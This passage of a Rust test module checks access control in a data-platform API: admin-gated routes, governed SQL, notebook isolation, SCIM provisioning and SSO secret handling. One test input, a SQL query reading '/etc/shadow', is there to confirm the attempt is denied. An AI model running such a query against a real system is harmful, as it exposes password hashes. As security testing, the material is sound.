            post(&st, "/api/clusters", &bob, r#"{"name":"x"}"#).await,
            StatusCode::FORBIDDEN
        );
        assert_eq!(
            post(
                &st,
                "/api/connections",
                &bob,
                r#"{"name":"glue1","kind":"glue","options":{"region":"us-east-1"}}"#
            )
            .await,
            StatusCode::FORBIDDEN
        );
        assert_eq!(
            post(
                &st,
                "/api/grants",
                &bob,
                r#"{"securable_type":"table","securable_name":"main.sales.orders","privilege":"SELECT","principal_kind":"group","principal_id":"x","effect":"allow"}"#
            )
            .await,
            StatusCode::FORBIDDEN
        );
        assert_eq!(
            post(
                &st,
                "/api/admin/users",
                &bob,
                r#"{"username":"x","password":"yyyyyyyyyyyy","groups":[]}"#
            )
            .await,
            StatusCode::FORBIDDEN
        );
        // But a non-admin can still run SQL (not an admin-gated action).
        assert_eq!(
            post(&st, "/api/sql", &bob, r#"{"sql":"SELECT 1"}"#).await,
            StatusCode::OK
        );
    }

    #[tokio::test]
    async fn non_admin_sql_is_governed() {
        let st = state();
        seed_governed_table(&st);
        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        assert_eq!(
            create_user_via_admin(&st, &admin, "carol", "passwordpassword", &[]).await,
            StatusCode::CREATED
        );
        let carol = login_token(&st, "carol", "passwordpassword").await.unwrap();

        let run = |token: String, sql: &str| {
            let st = st.clone();
            let body = format!(r#"{{"sql":{}}}"#, serde_json::to_string(sql).unwrap());
            async move {
                let resp = app(st)
                    .oneshot(
                        Request::post("/api/sql")
                            .header("content-type", "application/json")
                            .header("authorization", format!("Bearer {token}"))
                            .body(Body::from(body))
                            .unwrap(),
                    )
                    .await
                    .unwrap();
                body_json(resp).await
            }
        };

        // Without a grant, carol cannot read the governed table (fail-closed).
        let j = run(carol.clone(), "SELECT * FROM main.sales.monthly_revenue").await;
        assert!(
            j["error"].as_str().unwrap_or("").contains("permission denied"),
            "expected denial, got {j:?}"
        );
        // File-scan TVFs are blocked for non-admins (can't read raw files with engine creds).
        let j = run(carol.clone(), "SELECT * FROM read_parquet('/etc/shadow')").await;
        assert!(
            j["error"].as_str().unwrap_or("").contains("not permitted"),
            "expected TVF denial, got {j:?}"
        );
        // A bare scratch query (no governed table) is always allowed.
        assert!(run(carol.clone(), "SELECT 1 AS a").await["error"].is_null());

        // Admin grants ALL PRIVILEGES on catalog `main` → carol can now read it.
        assert_eq!(
            post(
                &st,
                "/api/grants",
                &admin,
                r#"{"securable_type":"catalog","securable_name":"main","privilege":"ALL PRIVILEGES","principal_kind":"user","principal_id":"carol","effect":"allow"}"#
            )
            .await,
            StatusCode::CREATED
        );
        let j = run(
            carol.clone(),
            "SELECT region, sum(revenue) r FROM main.sales.monthly_revenue GROUP BY region",
        )
        .await;
        assert!(j["error"].is_null(), "expected success after grant, got {j:?}");

        // Admin is never blocked (owns the metastore).
        let j = run(admin.clone(), "SELECT * FROM main.sales.monthly_revenue LIMIT 1").await;
        assert!(j["error"].is_null(), "admin query failed: {j:?}");
    }

    #[tokio::test]
    async fn notebooks_are_owner_isolated() {
        let st = state();
        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        for u in ["alice", "bob"] {
            assert_eq!(
                create_user_via_admin(&st, &admin, u, "passwordpassword", &[]).await,
                StatusCode::CREATED
            );
        }
        let alice = login_token(&st, "alice", "passwordpassword").await.unwrap();
        let bob = login_token(&st, "bob", "passwordpassword").await.unwrap();

        // Alice creates a notebook.
        let resp = app(st.clone())
            .oneshot(
                Request::post("/api/notebooks")
                    .header("content-type", "application/json")
                    .header("authorization", format!("Bearer {alice}"))
                    .body(Body::from(r#"{"name":"secret nb"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        let id = body_json(resp).await["id"].as_str().unwrap().to_string();

        let get = |token: String, path: String| {
            let st = st.clone();
            async move {
                app(st)
                    .oneshot(
                        Request::get(path)
                            .header("authorization", format!("Bearer {token}"))
                            .body(Body::empty())
                            .unwrap(),
                    )
                    .await
                    .unwrap()
            }
        };

        // IDOR: Bob cannot read Alice's notebook by id (404, not 403 — no existence leak).
        assert_eq!(
            get(bob.clone(), format!("/api/notebooks/{id}")).await.status(),
            StatusCode::NOT_FOUND
        );
        // Bob's listing doesn't include it.
        let list = body_json(get(bob.clone(), "/api/notebooks".into()).await).await;
        assert!(list.as_array().unwrap().is_empty());
        // Owner and admin can read it.
        assert_eq!(
            get(alice.clone(), format!("/api/notebooks/{id}"))
                .await
                .status(),
            StatusCode::OK
        );
        assert_eq!(
            get(admin.clone(), format!("/api/notebooks/{id}"))
                .await
                .status(),
            StatusCode::OK
        );
        // Bob cannot delete it (404); it survives for Alice.
        let resp = app(st.clone())
            .oneshot(
                Request::delete(format!("/api/notebooks/{id}"))
                    .header("authorization", format!("Bearer {bob}"))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
        assert_eq!(
            get(alice.clone(), format!("/api/notebooks/{id}"))
                .await
                .status(),
            StatusCode::OK
        );
    }

    #[tokio::test]
    async fn login_success_and_failure() {
        let st = state();
        assert!(login_token(&st, "admin", "secretsecret1234")
            .await
            .is_some());
        // Wrong password → no token (401).
        assert!(login_token(&st, "admin", "wrong").await.is_none());
        // Unknown user → 401.
        assert!(login_token(&st, "nobody", "secretsecret1234")
            .await
            .is_none());
    }

    #[tokio::test]
    async fn protected_routes_require_token() {
        let st = state();
        // No token → 401.
        let resp = app(st.clone())
            .oneshot(Request::get("/api/clusters").body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);

        // With token → 200, and /api/me reflects the principal.
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/me")
                    .header("authorization", format!("Bearer {token}"))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let me = body_json(resp).await;
        assert_eq!(me["user"], "admin");
        assert_eq!(me["authenticated"], true);
    }

    #[tokio::test]
    async fn healthz_is_public() {
        let resp = app(state())
            .oneshot(Request::get("/healthz").body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
    }

    #[tokio::test]
    async fn run_sql_executes_on_engine() {
        let st = state();
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let resp = app(st)
            .oneshot(
                Request::post("/api/sql")
                    .header("content-type", "application/json")
                    .header("authorization", format!("Bearer {token}"))
                    .body(Body::from(r#"{"sql":"SELECT 1 AS a, 'hi' AS b"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let j = body_json(resp).await;
        assert_eq!(j["columns"][0], "a");
        assert_eq!(j["columns"][1], "b");
        assert_eq!(j["rows"][0][0], "1");
        assert_eq!(j["rows"][0][1], "hi");
        assert!(j["error"].is_null());
    }


    #[tokio::test]
    async fn grant_create_and_list() {
        let st = state();
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let auth = format!("Bearer {token}");
        let resp = app(st.clone())
            .oneshot(
                Request::post("/api/grants")
                    .header("content-type", "application/json")
                    .header("authorization", &auth)
                    .body(Body::from(
                        r#"{"securable_type":"table","securable_name":"main.sales.orders","privilege":"SELECT","principal_kind":"group","principal_id":"analysts","effect":"allow"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::CREATED);
        let resp = app(st)
            .oneshot(
                Request::get("/api/grants")
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let j = body_json(resp).await;
        assert_eq!(j[0]["privilege"], "Select");
        assert_eq!(j[0]["principal_id"], "analysts");
    }

    #[tokio::test]
    async fn cluster_crud_with_auth() {
        let st = state();
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let auth = format!("Bearer {token}");

        let resp = app(st.clone())
            .oneshot(
                Request::post("/api/clusters")
                    .header("content-type", "application/json")
                    .header("authorization", &auth)
                    .body(Body::from(
                        r#"{"name":"analytics","worker_min":2,"worker_max":8}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::CREATED);
        let created = body_json(resp).await;
        let id = created["id"].as_str().unwrap().to_string();
        // Create kicks off async provisioning; with no `weft` binary configured in tests it can't
        // come up, so we don't assert RUNNING here. A create event is recorded, and stop terminates.
        let resp = app(st.clone())
            .oneshot(
                Request::get(format!("/api/clusters/{id}/events"))
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let events = body_json(resp).await;
        assert!(events
            .as_array()
            .unwrap()
            .iter()
            .any(|e| e["message"].as_str().unwrap().contains("created")));

        // Stop transitions to TERMINATED (no process needed).
        let resp = app(st.clone())
            .oneshot(
                Request::post(format!("/api/clusters/{id}/stop"))
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(body_json(resp).await["state"], "TERMINATED");
    }

    // ── SSO config + SCIM provisioning (end-to-end through the real router) ──

    /// Serialize tests that mutate process-global env (`WEFT_SCIM_TOKEN`, OIDC vars) so they don't
    /// race other env-touching tests in this binary.
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    #[tokio::test]
    async fn auth_config_reports_sso_disabled_by_default() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::remove_var("WEFT_OIDC_ISSUER");
        let st = state();
        let resp = app(st)
            .oneshot(
                Request::get("/api/auth/config")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let j = body_json(resp).await;
        assert_eq!(j["sso_enabled"], false);
        assert_eq!(j["provider_label"], "SSO");
    }

    #[tokio::test]
    async fn sso_login_503_when_disabled() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::remove_var("WEFT_OIDC_ISSUER");
        let st = state();
        let resp = app(st)
            .oneshot(
                Request::get("/api/auth/sso/login")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
    }

    /// Build state with a SCIM token set (constructed under the env lock).
    fn scim_state(token: &str) -> AppState {
        std::env::set_var("WEFT_SCIM_TOKEN", token);
        let st = AppState::new(
            "admin",
            "secretsecret1234",
            b"test-secret".to_vec(),
            PathBuf::from("web/dist"),
        );
        std::env::remove_var("WEFT_SCIM_TOKEN");
        st
    }

    #[tokio::test]
    async fn scim_disabled_returns_503() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::remove_var("WEFT_SCIM_TOKEN");
        let st = state();
        let resp = app(st)
            .oneshot(
                Request::get("/scim/v2/Users")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::SERVICE_UNAVAILABLE);
    }

    #[tokio::test]
    async fn scim_requires_bearer_token() {
        let _g = ENV_LOCK.lock().unwrap();
        let st = scim_state("scim-secret");
        // No token → 401.
        let resp = app(st.clone())
            .oneshot(
                Request::get("/scim/v2/Users")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
        // Wrong token → 401.
        let resp = app(st)
            .oneshot(
                Request::get("/scim/v2/Users")
                    .header("authorization", "Bearer wrong")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
    }

    #[tokio::test]
    async fn scim_user_provisioning_round_trip() {
        let _g = ENV_LOCK.lock().unwrap();
        let st = scim_state("scim-secret");
        let auth = "Bearer scim-secret";

        // Create a user in two groups.
        let resp = app(st.clone())
            .oneshot(
                Request::post("/scim/v2/Users")
                    .header("content-type", "application/scim+json")
                    .header("authorization", auth)
                    .body(Body::from(
                        r#"{"schemas":["urn:ietf:params:scim:schemas:core:2.0:User"],"userName":"alice@corp.com","groups":[{"value":"admins"},{"value":"analysts"}]}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::CREATED);
        let created = body_json(resp).await;
        assert_eq!(created["userName"], "alice@corp.com");
        assert_eq!(created["meta"]["resourceType"], "User");

        // The SSO/SCIM user has an empty password → local login must reject it.
        assert!(login_token(&st, "alice@corp.com", "").await.is_none());

        // Filtered list returns exactly that user.
        let resp = app(st.clone())
            .oneshot(
                Request::get(r#"/scim/v2/Users?filter=userName%20eq%20%22alice@corp.com%22"#)
                    .header("authorization", auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let j = body_json(resp).await;
        assert_eq!(j["totalResults"], 1);
        assert_eq!(j["Resources"][0]["userName"], "alice@corp.com");

        // The group store reflects the membership (admin endpoint, behind a session token).
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/admin/groups")
                    .header("authorization", format!("Bearer {token}"))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let groups = body_json(resp).await;
        let analysts = groups
            .as_array()
            .unwrap()
            .iter()
            .find(|g| g["name"] == "analysts")
            .expect("analysts group exists");
        assert!(analysts["members"]
            .as_array()
            .unwrap()
            .iter()
            .any(|m| m == "alice@corp.com"));

        // DELETE de-provisions.
        let resp = app(st.clone())
            .oneshot(
                Request::delete("/scim/v2/Users/alice@corp.com")
                    .header("authorization", auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::NO_CONTENT);
        let resp = app(st)
            .oneshot(
                Request::get("/scim/v2/Users/alice@corp.com")
                    .header("authorization", auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
    }

    #[tokio::test]
    async fn scim_group_patch_add_member() {
        let _g = ENV_LOCK.lock().unwrap();
        let st = scim_state("scim-secret");
        let auth = "Bearer scim-secret";

        // Create group with one member.
        app(st.clone())
            .oneshot(
                Request::post("/scim/v2/Groups")
                    .header("authorization", auth)
                    .header("content-type", "application/scim+json")
                    .body(Body::from(
                        r#"{"displayName":"engineers","members":[{"value":"alice"}]}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();

        // PATCH add a member.
        let resp = app(st.clone())
            .oneshot(
                Request::patch("/scim/v2/Groups/engineers")
                    .header("authorization", auth)
                    .header("content-type", "application/scim+json")
                    .body(Body::from(
                        r#"{"Operations":[{"op":"add","path":"members","value":[{"value":"bob"}]}]}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let g = body_json(resp).await;
        let members: Vec<&str> = g["members"]
            .as_array()
            .unwrap()
            .iter()
            .map(|m| m["value"].as_str().unwrap())
            .collect();
        assert!(members.contains(&"alice") && members.contains(&"bob"));
    }

    // ── Admin-gated SSO runtime config ──

    /// A session token for a non-admin principal (group `analysts`, not `admins`).
    fn non_admin_token(st: &AppState) -> String {
        st.issue_token("alice", &["analysts".to_string()]).unwrap()
    }

    #[tokio::test]
    async fn admin_routes_reject_non_admins() {
        let st = state();
        let token = non_admin_token(&st);
        let auth = format!("Bearer {token}");

        // GET /api/admin/sso → 403 for a non-admin.
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/admin/sso")
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);

        // A mutating grant from a non-admin → 403 (gating the existing routes too).
        let resp = app(st.clone())
            .oneshot(
                Request::post("/api/grants")
                    .header("authorization", &auth)
                    .header("content-type", "application/json")
                    .body(Body::from(
                        r#"{"securable_type":"table","securable_name":"main.s.t","privilege":"SELECT","principal_kind":"group","principal_id":"x","effect":"allow"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
    }

    #[tokio::test]
    async fn sso_config_default_disabled_and_put_bogus_issuer_400() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::remove_var("WEFT_OIDC_ISSUER");
        std::env::remove_var("WEFT_PUBLIC_BASE");
        let st = state();
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let auth = format!("Bearer {token}");

        // Fresh state → SSO disabled, public config agrees.
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/admin/sso")
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let j = body_json(resp).await;
        assert_eq!(j["enabled"], false);
        assert_eq!(j["has_secret"], false);
        assert!(j["callback_url"].as_str().unwrap().ends_with("/api/auth/callback"));

        let resp = app(st.clone())
            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(body_json(resp).await["sso_enabled"], false);

        // PUT with an undiscoverable issuer → 400 with the documented message.
        let resp = app(st.clone())
            .oneshot(
                Request::put("/api/admin/sso")
                    .header("authorization", &auth)
                    .header("content-type", "application/json")
                    .body(Body::from(
                        r#"{"issuer":"https://invalid.invalid","client_id":"cid","client_secret":"sec"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let msg = String::from_utf8_lossy(&bytes);
        assert!(msg.contains("could not discover OIDC issuer"), "got: {msg}");

        // Still disabled after the failed PUT.
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/admin/sso")
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(body_json(resp).await["enabled"], false);
    }

    #[tokio::test]
    async fn sso_delete_disables_runtime_config() {
        // Seed a live config directly (bypass discovery) so DELETE has something to turn off.
        let st = state();
        *st.oidc().write().unwrap() = Some(crate::oidc::OidcConfig::from_parts(
            "https://issuer.example".into(),
            "cid".into(),
            "sec".into(),
            "https://app/api/auth/callback".into(),
            None,
            None,
            Some("Okta".into()),
        ));
        // Public config reports it enabled.
        let resp = app(st.clone())
            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(body_json(resp).await["sso_enabled"], true);

        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let auth = format!("Bearer {token}");
        let resp = app(st.clone())
            .oneshot(
                Request::delete("/api/admin/sso")
                    .header("authorization", &auth)
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::NO_CONTENT);

        // Now disabled both at the live RwLock and the public config endpoint.
        assert!(st.oidc().read().unwrap().is_none());
        let resp = app(st.clone())
            .oneshot(Request::get("/api/auth/config").body(Body::empty()).unwrap())
            .await
            .unwrap();
        assert_eq!(body_json(resp).await["sso_enabled"], false);
    }

    #[tokio::test]
    async fn get_sso_never_returns_secret() {
        let st = state();
        *st.oidc().write().unwrap() = Some(crate::oidc::OidcConfig::from_parts(
            "https://issuer.example".into(),
            "cid".into(),
            "topsecret".into(),
            "https://app/api/auth/callback".into(),
            None,
            None,
            None,
        ));
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let resp = app(st.clone())
            .oneshot(
                Request::get("/api/admin/sso")
                    .header("authorization", format!("Bearer {token}"))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let body = String::from_utf8_lossy(&bytes);
        assert!(!body.contains("topsecret"), "secret leaked: {body}");
        let j: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(j["has_secret"], true);
        assert_eq!(j["client_id"], "cid");
    }

    #[tokio::test]
    async fn put_sso_empty_secret_no_existing_config_400() {
        // With no existing config and an omitted secret, the secret-reuse path has nothing to reuse,
        // so it 400s *before* attempting discovery (a clear message for the admin).
        let st = state();
        let token = login_token(&st, "admin", "secretsecret1234").await.unwrap();
        let resp = app(st.clone())
            .oneshot(
                Request::put("/api/admin/sso")
                    .header("authorization", format!("Bearer {token}"))
                    .header("content-type", "application/json")
                    .body(Body::from(
                        r#"{"issuer":"https://issuer.example","client_id":"cid"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        assert!(String::from_utf8_lossy(&bytes).contains("client_secret is required"));
    }
}
